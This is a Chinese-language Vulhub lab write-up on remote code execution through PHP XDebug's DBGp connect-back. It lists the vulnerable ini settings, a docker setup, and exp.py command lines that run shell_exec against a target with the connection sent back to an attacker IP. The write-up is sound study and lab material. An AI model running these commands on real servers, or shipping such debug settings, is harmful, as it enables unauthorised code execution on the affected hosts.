# PHP XDebug远程调试导致代码执行漏洞

XDebug是一个用于调试PHP代码的扩展。当启用远程调试模式并设置适当的配置时，攻击者可以通过利用调试协议(DBGp)在目标服务器上执行任意PHP代码。

对于XDebug 2.x版本，当配置如下时存在漏洞：

```ini
xdebug.remote_connect_back = 1
xdebug.remote_enable = 1
```

对于XDebug 3.x版本，当配置如下时存在漏洞：

```ini
xdebug.mode = debug
xdebug.discover_client_host = 1
xdebug.client_host = 1
```

当启用这些配置时，XDebug会在接收到`XDEBUG_SESSION_START`、`XDEBUG_SESSION`、`XDEBUG_TRIGGER`等参数时，尝试通过DBGp协议连接回攻击者的IP。该协议提供了一个`eval`函数，可用于执行任意PHP代码。

参考链接：

- <https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface>
- <https://xdebug.org>

## 环境搭建

执行如下命令编译并启动漏洞环境：

```
docker compose up -d
```

该环境包含两个服务：

- PHP 7.1 + XDebug 2.5.5：可通过`http://your-ip:8080/`访问
- PHP 7.4 + XDebug 3.1.6：可通过`http://your-ip:8081/`访问

环境启动后，访问各个URL可以看到一个简单的phpinfo页面。在PHP配置部分可以验证XDebug已启用并配置了远程调试功能。

## 漏洞复现

由于漏洞需要使用DBGp协议与目标服务器通信，所以无法仅使用HTTP协议复现漏洞。

Vulhub提供了一个简单的漏洞利用脚本[exp.py](exp.py)，可以在目标服务器上执行任意PHP代码。该脚本同时支持XDebug 2.x（端口9000）和XDebug 3.x（端口9003）：

```bash
# 需要Python 3和requests库
python3 exp.py -t http://[target-ip]:8080/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
python3 exp.py -t http://[target-ip]:8081/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
```

成功利用漏洞后将执行命令并返回输出：

![](1.png)

### 重要说明

漏洞利用过程涉及反向连接：

1. 利用脚本同时监听9000端口（XDebug 2.x）和9003端口（XDebug 3.x），请确保这些端口没有被防火墙阻止
2. 你需要有一个公网IP地址或与目标在同一网络中才能接收到连接
3. 如果你的公网IP与本地机器不同，请使用`--dbgp-ip`参数指定目标服务器可以访问的IP地址
